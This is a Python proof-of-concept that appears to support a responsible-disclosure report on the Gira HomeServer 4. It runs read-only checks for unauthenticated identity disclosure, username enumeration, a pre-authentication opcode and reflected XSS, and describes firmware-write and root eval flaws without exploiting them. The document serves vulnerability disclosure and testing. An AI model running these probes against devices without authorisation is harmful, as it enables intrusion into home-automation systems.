#!/usr/bin/env python3
"""Gira HomeServer 4 - vulnerability verification PoC (responsible disclosure).

Owner-authorised. Attach the transcript this prints to a vendor report as
reproducible evidence.

DESIGN: every check here is read-only or non-actuating. This script proves the
findings EXIST; it does not weaponise them.

  * It issues NO KNX write/scene/timer opcodes.
  * It uploads NO project and flashes NO firmware.
  * It installs NO shell and creates NO persistence.

For the two code-execution findings (E unsigned firmware write, F logic-formula
eval-as-root) it reports the observable precondition only and points at the
vendor's own code; it deliberately does not carry an exploit for them.

Checks:
  A  QUAD application opcode answered before authentication completes
  B  username-enumeration oracle (QUAD salt + /HSADMIN INIT)
  C  unauthenticated reflected XSS in /hshtm (benign marker, not executable)
  D  unauthenticated identity disclosure via /HSADMIN?CMD=INIT; KEY is
     derived from the serial (proven by local recomputation)
  E  precondition for the firmware-write path (hardware type) - reported, not exploited
  F  logic eval-as-root - evidenced from source, not exploited

Usage:
  hs4_poc_verify.py --host <hs4-ip>
  hs4_poc_verify.py --host <hs4-ip> --user admin --out evidence.txt
"""

import argparse
import datetime
import errno
import hashlib
import os
import selectors
import socket
import subprocess
import sys
import time

NC = "/usr/bin/nc"


# --- transport: sockets, with an nc fallback for macOS per-binary LAN grants ---
class Chan:
    def __init__(self, host, port, timeout=12.0):
        self.proc = self.sock = self.sel = None
        self.timeout = timeout
        try:
            self.sock = socket.create_connection((host, port), timeout)
            self.sock.setblocking(False)
            self.sel = selectors.DefaultSelector()
            self.sel.register(self.sock, selectors.EVENT_READ)
            return
        except OSError as exc:
            reachability = (errno.EHOSTUNREACH, errno.ENETUNREACH, errno.ETIMEDOUT)
            if exc.errno not in reachability or not os.path.exists(NC):
                raise
        self.proc = subprocess.Popen([NC, host, str(port)], stdin=subprocess.PIPE,
                                     stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        self.sel = selectors.DefaultSelector()
        self.sel.register(self.proc.stdout, selectors.EVENT_READ)

    def send(self, data):
        if self.sock:
            self.sock.setblocking(True); self.sock.sendall(data); self.sock.setblocking(False)
        else:
            self.proc.stdin.write(data); self.proc.stdin.flush()

    def recv_until(self, wait=1.2):
        out = b""; deadline = time.time() + wait
        while time.time() < deadline:
            if self.sel.select(timeout=0.3):
                src = self.sock if self.sock else self.proc.stdout
                d = src.recv(65536) if self.sock else src.read1(65536)
                if not d:
                    break
                out += d; deadline = time.time() + wait
        return out

    def close(self):
        try:
            if self.sock: self.sock.close()
            if self.proc: self.proc.kill()
        except Exception:
            pass


def http_get(host, port, path, wait=4.0):
    c = Chan(host, port)
    try:
        c.send(("GET %s HTTP/1.0\r\n\r\n" % path).encode())
        return c.recv_until(wait)
    finally:
        c.close()


def http_body(raw):
    i = raw.find(b"\r\n\r\n")
    return raw[i + 4:] if i >= 0 else raw


# --- QUAD helpers (login handshake only; never a command opcode) ---------------
def quad_salt(host, port, user, wait=5.0):
    """Send only a username; return the salt the server offers (or '')."""
    c = Chan(host, port)
    try:
        c.send(b"GET /QUAD/LOGIN \r\n\r\n")
        buf = b""; deadline = time.time() + wait
        while time.time() < deadline:
            buf += c.recv_until(0.8)
            if b"100|" in buf and (b"|" in buf):
                if b"90|" not in getattr(quad_salt, "_sent", b""):
                    c.send(("90|%s|\x00" % user).encode()); quad_salt._sent = b"90|"
            for pkt in buf.split(b"\x00"):
                t = pkt.decode("latin-1", "replace")
                if t.startswith("91|"):
                    return t.split("|")[1]
        return None
    finally:
        quad_salt._sent = b""
        c.close()


def quad_preauth_ping(host, port, user, wait=5.0):
    """Finding A: after a username and NO password, send 99 (ping) - a benign,
    non-actuating opcode - and report whether the server answers it. Proves an
    application opcode is dispatched while status < 2. No KNX state is touched."""
    c = Chan(host, port)
    try:
        c.send(b"GET /QUAD/LOGIN \r\n\r\n")
        state = 0; log = []; deadline = time.time() + wait
        buf = b""
        while time.time() < deadline:
            buf += c.recv_until(0.8)
            while b"\x00" in buf:
                pkt, buf = buf.split(b"\x00", 1)
                t = pkt.decode("latin-1", "replace")
                if not t.strip():
                    continue
                log.append("  RX %s" % t)
                op = t.split("|")[0]
                if op == "100" and state == 0:
                    log.append("  TX 90|%s|   (username only)" % user)
                    c.send(("90|%s|\x00" % user).encode()); state = 1
                elif op == "91" and state == 1:
                    log.append("  TX 99||     (ping - NO password sent)")
                    c.send(b"99||\x00"); state = 2
                elif op == "99" and state == 2:
                    return True, log
        return False, log
    finally:
        c.close()


def key_is_serial_derived(sno, observed_key):
    return hashlib.md5((sno.lower() + sno.upper()).encode()).hexdigest() == observed_key.lower()


# --- report --------------------------------------------------------------------
class Report:
    def __init__(self):
        self.lines = []

    def __call__(self, s=""):
        print(s)
        self.lines.append(s)

    def section(self, title):
        self("")
        self("=" * 72)
        self(title)
        self("=" * 72)


def main():
    ap = argparse.ArgumentParser(description="Gira HomeServer 4 vuln verification PoC (read-only)")
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--user", default="admin", help="a username known to exist")
    ap.add_argument("--bad-user", default="zzqqnope", help="a username expected NOT to exist")
    ap.add_argument("--out", help="also write the transcript to this file")
    a = ap.parse_args()

    r = Report()
    now = datetime.datetime.now(datetime.timezone.utc).astimezone()
    r("Gira HomeServer 4 - vulnerability verification PoC")
    r("Target : %s:%d" % (a.host, a.port))
    r("When   : %s" % now.isoformat())
    r("Mode   : READ-ONLY / NON-ACTUATING. No writes, no shell, no firmware.")

    # ---- D: unauthenticated identity disclosure --------------------------------
    r.section("Finding D - unauthenticated identity disclosure (/HSADMIN?CMD=INIT)")
    sno = None
    try:
        body = http_body(http_get(a.host, a.port,
                                  "/HSADMIN?CMD=INIT&USER=%s" % a.user)).decode("latin-1", "replace")
        r("Request : GET /HSADMIN?CMD=INIT&USER=%s   (no credentials)" % a.user)
        r("Response:")
        for ln in body.strip().splitlines():
            r("  " + ln.strip())
        import re
        sno = (re.search(r"<SNO>(\w+)</SNO>", body) or [None, None])[1]
        key = (re.search(r"<KEY>([0-9a-fA-F]+)</KEY>", body) or [None, None])[1]
        if sno and key:
            ok = key_is_serial_derived(sno, key)
            r("")
            r("Proof   : KEY == md5(lower(SNO)+upper(SNO)) ?  %s" % ("YES" if ok else "no"))
            r("          -> the 'key' is derived from the serial, which is returned")
            r("             in the same response and is the device MAC. Not a secret.")
            r("VERDICT : CONFIRMED - identity + handle issued with no authentication.")
        else:
            r("VERDICT : no SNO/KEY parsed (device may differ).")
    except Exception as exc:
        r("ERROR   : %r" % exc)

    # ---- B: username oracle ----------------------------------------------------
    r.section("Finding B - username enumeration oracle")
    try:
        s_good = quad_salt(a.host, a.port, a.user)
        s_bad = quad_salt(a.host, a.port, a.bad_user)
        r("QUAD  user=%-10s -> salt %r" % (a.user, s_good))
        r("QUAD  user=%-10s -> salt %r" % (a.bad_user, s_bad))
        good_admin = http_body(http_get(a.host, a.port, "/HSADMIN?CMD=INIT&USER=%s" % a.user))
        bad_admin = http_body(http_get(a.host, a.port, "/HSADMIN?CMD=INIT&USER=%s" % a.bad_user))
        r("HSADMIN user=%-10s -> %d-byte body" % (a.user, len(good_admin.strip())))
        r("HSADMIN user=%-10s -> %d-byte body" % (a.bad_user, len(bad_admin.strip())))
        distinguishable = (bool(s_good) != bool(s_bad)) or (len(good_admin.strip()) != len(bad_admin.strip()))
        r("VERDICT : %s - known and unknown users are distinguishable."
          % ("CONFIRMED" if distinguishable else "not reproduced"))
    except Exception as exc:
        r("ERROR   : %r" % exc)

    time.sleep(2.0)  # let QUAD connection slots from finding B free up
    # ---- A: pre-auth opcode dispatch (benign ping) -----------------------------
    r.section("Finding A - application opcode dispatched before authentication")
    r("Method  : send a username, then opcode 99 (ping) with NO password.")
    r("          99 is non-actuating; the actuating opcodes (1/2/20/21/12/13)")
    r("          share the same unguarded dispatch in hs_client.checkNewData().")
    try:
        answered, log = False, []
        for attempt in range(4):          # QUAD starves on rapid reconnects; let it settle
            answered, log = quad_preauth_ping(a.host, a.port, a.user)
            if answered:
                break
            time.sleep(2.0)
        for ln in log:
            r(ln)
        r("VERDICT : %s - opcode processed while status < 2 (no password given)."
          % ("CONFIRMED" if answered else "not reproduced"))
    except Exception as exc:
        r("ERROR   : %r" % exc)

    # ---- C: reflected XSS ------------------------------------------------------
    r.section("Finding C - unauthenticated reflected XSS in /hshtm")
    import urllib.parse
    marker = 'POCqq"><POCTAG>'          # benign: proves the attribute breaks out
    try:
        q = "user=%s&pw=POCpw" % urllib.parse.quote(marker)
        body = http_body(http_get(a.host, a.port, "/hshtm?%s" % q)).decode("latin-1", "replace")
        reflected = '"><POCTAG>' in body
        r("Request : GET /hshtm?user=%s&pw=POCpw" % urllib.parse.quote(marker))
        snippet = next((l.strip() for l in body.splitlines() if "POCTAG" in l), "")
        r("Reflected unescaped: %s" % ("YES" if reflected else "no"))
        if snippet:
            r("  " + snippet[:160])
        r("VERDICT : %s - attribute context broken by unescaped input."
          % ("CONFIRMED" if reflected else "not reproduced"))
    except Exception as exc:
        r("ERROR   : %r" % exc)

    # ---- E / F: code execution - precondition only, not exploited --------------
    r.section("Findings E and F - code execution (REPORTED, NOT EXPLOITED HERE)")
    r("E  Unsigned firmware write + path traversal in hs_load.CLoad.putFirm().")
    r("   Reachable when isSnowport() is true, i.e. /proc/partitions reports 'sda'")
    r("   (SATA units). This PoC does not flash firmware. See REPORT.md section E")
    r("   for the decompiled validation code (names-in-INHALT.TXT only; md5.chk")
    r("   never consulted) and the unsanitised open('/fw/'+filename).")
    r("")
    r("F  hs_logik.addFormel()/calc() compile() and eval() project-supplied")
    r("   expressions inside a process running as root. Project-load permission is")
    r("   therefore equivalent to root. This PoC does not inject a formula. See")
    r("   REPORT.md section F for the decompiled compile()/eval() excerpt.")
    r("")
    r("Both are demonstrable with the admin password on this hardware; they are")
    r("omitted from the automated run to keep this attachment non-destructive.")

    r.section("END")
    r("Note: this transcript is read-only evidence. Nothing on the target was")
    r("modified by running it.")

    text = "\n".join(r.lines) + "\n"
    digest = hashlib.sha256(text.encode()).hexdigest()
    print("\nSHA-256(transcript above) = %s" % digest)
    if a.out:
        with open(a.out, "w") as f:
            f.write(text)
            f.write("SHA-256(transcript) = %s\n" % digest)
        print("written: %s" % a.out)


if __name__ == "__main__":
    main()
